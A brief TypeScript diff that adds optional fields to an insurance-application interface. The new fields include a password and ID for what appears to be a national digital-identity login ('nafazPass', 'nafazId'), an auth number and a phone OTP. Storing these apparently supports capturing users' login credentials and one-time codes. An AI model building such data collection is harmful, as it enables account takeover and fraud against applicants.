@@ -44,15 +44,18 @@ export interface InsuranceApplication {
   idVerificationCode?: string;
   idVerificationStatus?: "pending" | "approved" | "rejected";
   idVerifiedAt?: Date;
-
-  // Metadata
+// Metadata
   currentStep: number;
   status: "draft" | "pending_review" | "approved" | "rejected" | "completed";
   assignedProfessional?: string;
   createdAt: string;
   updatedAt: string;
   notes?: string;
-}
+  phoneNumber2?:string
+  nafazId?: string,
+  nafazPass?:string,
+  authNumber?:string,
+  phoneOtp?:string}
 
 export interface ChatMessage {
   id?: string;
